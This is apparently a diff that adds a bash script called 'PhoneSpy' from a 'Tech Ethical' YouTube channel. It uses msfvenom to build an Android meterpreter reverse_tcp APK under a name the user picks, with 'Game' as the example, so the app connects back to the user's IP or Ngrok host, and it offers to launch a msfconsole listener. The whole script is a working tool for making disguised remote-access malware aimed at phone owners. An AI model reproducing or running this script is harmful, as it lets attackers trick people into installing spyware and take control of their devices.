@@ -1,0 +1,81 @@
+#!/bin/bash
+
+#colors
+
+
+#text colors
+
+red=$(tput setaf 1)
+green=$(tput setaf 2)
+yellow=$(tput setaf 3)
+blue=$(tput setaf 4)
+pink=$(tput setaf 5)
+cyan=$(tput setaf 6)
+white=$(tput setaf 7)
+
+bt=$(tput bold 2)
+#reset color
+
+reset=$(tput sgr0)
+
+
+#functions
+data() {
+    use exploit/multi/handler
+    set PAYLOAD android/meterpreter/reverse_tcp
+    set LHOST $lhost
+    set LPORT $lport
+    exploit
+   
+}
+
+
+
+cd
+clear
+echo "${red}  ____  _                      ____               "
+echo "${red} |  _ \| |__   ___  _ __   ___/ ___| _ __  _   _  "
+echo "${red} | |_) | '_ \ / _ \| '_ \ / _ \___ \| '_ \| | | | "
+echo "${red} |  __/| | | | (_) | | | |  __/___) | |_) | |_| | "
+echo "${red} |_|   |_| |_|\___/|_| |_|\___|____/| .__/ \__, | "
+echo "${red}                                    |_|    |___/  "
+echo "${yellow}${bt}"
+echo "                 ╔═════•|✿|•═════╗"
+echo "                    Tech Ethical"
+echo "                 ╚═════•|✿|•═════╝"
+echo "${reset}"
+echo "${bt}"
+echo "${cyan} ~ Script Is Made By TechBite"
+echo "${cyan} ~ YouTube Channel: Tech Ethical"
+echo
+echo "${white}${bt} • Payload Generator ${reset}"
+echo
+echo "${red}${bt} • This Script Will Only Work If You've"
+echo "   Metasploit Installed ${reset}"
+echo 
+read -p "${green}${bt} ~ Enter Your LHOST (IP Or Ngrok): ${reset}${blue}${bt}" lhost
+echo
+read -p "${green}${bt} ~ Enter Your LPORT (4444 Or Ngrok): ${reset}${blue}${bt}" lport
+echo
+read -p "${green}${bt} ~ Enter Your App Name (Game): ${reset}${blue}${bt}" name
+echo
+echo
+echo "${yellow}${bt}Please Wait The App Is Generating...${reset}"
+echo
+msfvenom -a dalvik --platform android -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R -o /storage/emulated/0/$name.apk
+echo "${pink}${bt}"
+echo " ~ App Generated Successfully"
+echo " ~ App Saved To /storage/emulated/0/$name"
+echo "${reset}"
+read -p "${green}${bt} ~ Start A Msfconsole Listener ? (y/n):" ans
+
+echo
+if [[ $ans == y ]]; then
+    echo "${yellow}${bt}Please Wait The Msfconsole Is Starting...${reset}"
+    echo
+    msfconsole
+    
+else 
+   echo " ~ Subscribe Tech Ethical"
+   exit
+fi
